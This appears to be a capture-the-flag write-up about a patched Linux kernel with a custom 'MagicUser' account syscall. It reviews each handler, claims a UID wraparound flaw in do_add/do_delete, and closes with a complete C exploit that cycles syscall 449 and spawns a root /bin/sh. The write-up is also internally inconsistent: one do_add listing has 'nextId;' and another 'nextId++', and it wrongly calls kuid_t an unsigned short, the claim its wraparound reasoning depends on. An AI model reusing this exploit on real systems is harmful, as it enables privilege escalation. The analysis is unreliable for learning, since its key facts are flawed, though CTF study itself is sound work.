# Code Review of the patched kernel 

---

### MagicUser Struct
```c
struct MagicUser {
    // The UID represented by this user
    kuid_t uid;
    // A pointer to a list of up to 64 pointers
    struct MagicUser** children;
    char username[64];
    char password[64];
};
```
- the struct is 144 bytes in size.

- this struct contains the details of each user including the username, password and UID (user-id), it also contains a pointer to a list, this children pointer seems to contain pointers to more users.

---

### analysis of the `do_add()` function

```c
long do_add(char* username, char* password) {
    int mainlist_slot;
    int child_slot;
    struct MagicUser* me;
    struct MagicUser* newUser;
    long ret;
    int index;

    if (locate_user_by_name(magic_users, MAINLIST_SIZE, username) != -1) {
        return -EEXIST;
    }

    mainlist_slot = locate_empty(magic_users, MAINLIST_SIZE);
    
    if (mainlist_slot == -1) {
        return -ENOMEM;
    } else {}

    index = locate_user_by_uid(magic_users, MAINLIST_SIZE, current->cred->uid.val);
    
    if (index == -1) {
        return -ENOENT;
    }
    
    me = magic_users[index];
    child_slot = locate_empty(me->children, CHILDLIST_SIZE);
    
    if (child_slot == -1) {
        return -ENOMEM;
    }
    
    newUser = kzalloc(sizeof(struct MagicUser), GFP_KERNEL);
    
    if (newUser == NULL) {
        return -ENOMEM;
    }
    
    newUser->uid.val = nextId;
    memcpy(newUser->username, username, 64);
    memcpy(newUser->password, password, 64);
    newUser->children = kzalloc(sizeof(struct MagicUser*) * CHILDLIST_SIZE, GFP_KERNEL);
    
    if (newUser->children == NULL) {
        kfree(newUser);
        return -ENOMEM;
    }
    
    magic_users[mainlist_slot] = newUser;
    me->children[child_slot] = newUser;
    ret = (long)nextId;
    nextId;
    return ret;
}
```

1. it will first check if the username passed is already a username, if it is, it'll return `-EEXIST` meaning file exists.

2. after that it'll set `mainlist_slot` equal to the first empty slot in the `magic_users` array if locate_empty() returns -1 it'll return `-ENOMEM` meaning out of memory.

3. it'll set index equal to whatever locate_user_by_uid() returns which will return the position in the MagicUser array which a user with the UID specified lives or -1 if it doesn't find it, if -1 IS returned it'll return `-ENOENT` meaning no such file or directory.

**NOTE**: `magic_users` is an array of pointers to MagicUser struct, each pointing to a structure representing a magic user, and initialized with all elements set to NULL.

4. `me` is now a struct pointer for `struct MagicUser*` pointing to whatever index in magic_users, child_slot will be equal to the next empty slot unless locate_empty() returns -1, it'll subsequently return `-ENOMEM` meaning out of memory.

5. `newUser` will become a pointer to memory returned by `kzalloc(sizeof(struct MagicUser), GFP_KERNEL);` unless kzalloc() returns NULL if so it'll return `-ENOMEM`, the struct members will then be filled out and written into memory.

6. if `NewUser->children` is NULL it'll kfree newUser and return `-ENOMEM`.

7. `magic_users` and `children` arrarys will both be updated with the data returned by the newUser struct, after that ret will be equal to the nextId which is the UID, after that nextId will be incremented and nextId will be returned.

---

### `do_edit()` function
```c
long do_edit(char* username, char* password) {
    int index;
    int myIndex;
    struct MagicUser* me;
    struct MagicUser* child;

    myIndex = locate_user_by_uid(magic_users, MAINLIST_SIZE, current->cred->uid.val);
    
    if (myIndex == -1) {
        return -ENOENT;
    }
    me = magic_users[myIndex];
    if (strncmp(me->username, username, 64) == 0) {
        child = me;
    } else {
        index = locate_user_by_name(me->children, CHILDLIST_SIZE, username);
        if (index == -1) {
            return -EPERM;
        }
        child = me->children[index];
    }
    strncpy(child->password, password, 64);
    return 0;
}
```

1. `myIndex` will be equal to the current user id, if locate_user_by_uid() returns -1 it will return `-ENOENT` meaning no such file or directory.

2. `me` will be equal to the current MagicUser and if the usernames are equal then `child` will be equal to `me`. it'll strncmp me->username to the username passed into the function if they match then child will become equal to me which is the current MagicUser, otherwise it'll set index to locate_user_by_name() passing in the username passed to the function if -1 is returned `EPERM` will be thrown meaning operation not permitted, and child will become equal to `me->children[index]`

3. finally strncpy the password passed to the function into the child->password member of the MagicUser struct.

---

### `do_switch()` function
```c
long do_switch(char* username, char* password) {
    int index;
    int myIndex;
    struct MagicUser* me;
    struct MagicUser* child;
    struct cred* new;
    struct user_namespace *ns;
    kuid_t kuid;
    kgid_t kgid;

    myIndex = locate_user_by_uid(magic_users, MAINLIST_SIZE, current->cred->uid.val);
    if (myIndex == -1) {
        return -ENOENT;
    }
    me = magic_users[myIndex];
    if (strncmp(me->username, username, 64) == 0) {
        // Immediately return - we are the requested user
        return 0;
    }
    // Try and switch to a child
    index = locate_user_by_name(me->children, CHILDLIST_SIZE, username);
    if (index == -1) {
        // Not a child, look for the user in the global list
        index = locate_user_by_name(magic_users, MAINLIST_SIZE, username);
        if (index == -1) {
            // User doesn't exist at all
            return -ENOENT;
        } else if (index == 0) {
            // Prevent logging back in as root
            return -EPERM;
        }
        child = magic_users[index];
        // Check the passed password is correct - if no password was passed, fail
        if (password == NULL) return -EFAULT;
        if (strncmp(password, child->password, 64) != 0) {
            return -EPERM;
        }
    } else {
        // Switching to a child is allowed without the password
        child = me->children[index];
    }
    new = prepare_creds();
    if (!new) return -ENOMEM;
    ns = current_user_ns();
    kuid = make_kuid(ns, child->uid.val);
    kgid = make_kgid(ns, child->uid.val);
    if (!uid_valid(kuid)) return -EINVAL;
    if (!gid_valid(kgid)) return -EINVAL;
    new->suid = new->uid = kuid;
    new->fsuid = new->euid = kuid;
    new->sgid = new->gid = kgid;
    new->fsgid = new->egid = kgid;
    return commit_creds(new);
}
```

1. `myIndex` will be set to the current user id, if myIndex is -1 `-EOENT` will be thrown, me will be equal to the current MagicUser, strncmp gets called on the current username and the username passed to the function, if the same return 0.

```c
    // Try and switch to a child
    index = locate_user_by_name(me->children, CHILDLIST_SIZE, username);
    if (index == -1) {
        // Not a child, look for the user in the global list
        index = locate_user_by_name(magic_users, MAINLIST_SIZE, username);
        if (index == -1) {
            // User doesn't exist at all
            return -ENOENT;
        } else if (index == 0) {
            // Prevent logging back in as root
            return -EPERM;
        }
        child = magic_users[index];
        // Check the passed password is correct - if no password was passed, fail
        if (password == NULL) return -EFAULT;
        if (strncmp(password, child->password, 64) != 0) {
            return -EPERM;
        }
    } else {
        // Switching to a child is allowed without the password
        child = me->children[index];
    }
```
2. since this section is heavily commented ill move down...

3. The bottom part of this function prepares for and executes a user switch by creating a new set of credentials (prepare_creds), setting the user and group IDs to those of the target user (child), and then committing these credentials to the current process. It allocates memory for new credentials (prepare_creds), checks for allocation success, and validates the user and group IDs (uid and gid). It sets both the real and effective user and group IDs, as well as the saved and filesystem IDs, to ensure the process fully assumes the identity of child. If the new IDs are invalid, it returns an error. Finally, it applies the changes (commit_creds), effectively changing the executing process's permissions to those of the target user.

---

### `delete_user()` function
```c
void delete_user(struct MagicUser* user) {
    int i;
    struct MagicUser* child;

    for (i = 0; i < CHILDLIST_SIZE; i++) {
        child = user->children[i];
        if (child == NULL) continue;
        delete_user(child);
        user->children[i] = NULL;
    }
    kfree(user->children);
    kfree(user);
}
```
1. this will loop 64 times and check each child in the array of children if it's null it'll continue if not it'll do recurresion and set user->children[i] to NULL and then kfree() children and user.

---
### `do_delete()` function
```c
long do_delete(char* username) {
    int index;
    int myIndex;
    int globalIndex;
    struct MagicUser* me;
    struct MagicUser* child;

    myIndex = locate_user_by_uid(magic_users, MAINLIST_SIZE, current->cred->uid.val);
    if (myIndex == -1) {
        return -ENOENT;
    }
    
    me = magic_users[myIndex];
    index = locate_user_by_name(me->children, CHILDLIST_SIZE, username);
    
    if (index == -1) {
        return -EPERM;
    }

    globalIndex = locate_user_by_name(magic_users, MAINLIST_SIZE, username);
    child = me->children[index];
    delete_user(child);
    me->children[index] = NULL;
    magic_users[globalIndex] = NULL;

    return 0;
}
```
1. it'll grab `myIndex` by using locate_user_by_uid() on the current user id, if the function returns -1 it'll return `-ENOENT` if not it'll continue, `me` gets set to the current MagicUser and `index` gets set to locate_user_by_name() passing in the first argument to the function which is the username to delete if index is equal to -1 it'll return `-EPERM`

2. afterwards globalIndex will be set to the index of the username being deleted in the magic_users array, child will be set to `me->children[index]` and child will then be sent off to delete_user() and children[index] of current MagicUser and the user being deleted will be nulled out.

---

### Vulnerability Analysis
- wraparound within the do_add() and do_delete() function allowing us to switch into root.
```c
    magic_users[mainlist_slot] = newUser;
    me->children[child_slot] = newUser;
    ret = (long)nextId;
    nextId++;
    return ret;
```
- since do_delete() never decrements nextId we can just make nextId wraparound by adding and deleting a bunch of times.

- as we know nextId is just a `kuid_t` which is a kernel type meaning `unsigned short`, we can eventually make this wraparound to 0 and switch to the user that wrapped around and get root.


---

### modified run.sh script
```bash
#!/bin/bash


musl-gcc -static exploit.c -o exploit
strip --strip-all exploit

cpio_file="dist.cpio.gz"
exploit_file="exploit"
temp_dir="temp"

mkdir -p "$temp_dir"
gzip -d < "$cpio_file" | cpio -idmv -D "$temp_dir"
cp "$exploit_file" "$temp_dir"

cd "$temp_dir" || exit
find . | cpio -o -H newc | gzip > "../$cpio_file"

cd ..
rm -rf "$temp_dir"



qemu-system-x86_64 \
        -kernel ./bzImage \
        -initrd ./dist.cpio.gz \
        -monitor /dev/null \
        -nographic -append "console=ttyS0" \
```

---

### exploit:
```c
#include <stdio.h>
#include <sys/syscall.h>
#define _GNU_SOURCE
#include <unistd.h>
#include <stdbool.h>


void do_add(char* username, char* password) {
	long ret = syscall(449, 0, username, password);
	printf("\ndo_add() returned: %li when adding user: %s with passwd: %s", ret, username, password);
}


void do_edit(char* username, char* password) {
	long ret = syscall(449, 1, username, password);
	printf("\ndo_edit() returned: %li when editing user %s with password %s", ret, username, password);
}


void do_delete(char* username) {
	long ret = syscall(449, 2, username);
	printf("\ndo_delete() returned %li when deleting %s", ret, username);
}


void do_switch(char* username, char* password) {
	long ret = syscall(449, 3, username, password);
	printf("\ndo_switch() returned: %li when switching to %s with passwd: %s", ret, username, password);
}


int main() {
    char user[64];
    char pass[64];

    for (int i = 0; i < 65535; i++) {
        int int_passwd = (0x41 + i);
        int int_user = (0x41 + i);
        
        sprintf(user, "%d", int_user);
        sprintf(pass, "%d", int_passwd);
        

        do_add(user, pass);
        printf("%i", int_user);
        
        if (int_user == 65599) {
            do_switch(user, pass);
            char *shell_path = "/bin/sh";
            char *args[] = {shell_path, NULL};
            execve(shell_path, args, NULL);
        } else {do_delete(user);}
        
		printf("\n");
    }
	
	return 0;
}
```
